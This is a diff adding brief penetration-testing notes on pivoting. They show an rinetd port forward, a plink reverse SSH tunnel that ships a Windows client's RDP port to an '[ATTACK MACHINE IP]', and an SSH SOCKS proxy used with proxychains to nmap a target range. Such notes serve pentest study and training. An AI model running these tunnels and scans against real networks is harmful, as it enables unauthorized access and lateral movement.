@@ -1,0 +1,20 @@
+#Linux Port Forwarding
+vi /etc/rinetd.conf
+--update the file with the follwing line
+[START ADDRESS] [START PORT] [DESTINATION ADDRESS] [DESTINATION PORT]
+--then restart inetd
+/etc/init.d/rinetd restart
+
+
+#SSH Tunnels local ports
+--get plink to windows client and ship the 3389 port to 3390 on the attack
+plink -l [LINUX USERNAME] -pw [LINUX PW]  [ATTACK MACHINE IP] -R3390 10.10.10.10:3389
+
+
+#SSH Dynamic Port forwarding (SOCKS proxy) to proxy nmap
+ssh -D [LOCAL PORT] -p [REMOTE PORT] [TARGET IP]
+-- then edit proxy chains, adding following line
+socks4 127.0.0.1 [LOCAL PORT]
+proxychains nmap -p 3389 -Pn [TARGET RANGE] --open
+
+
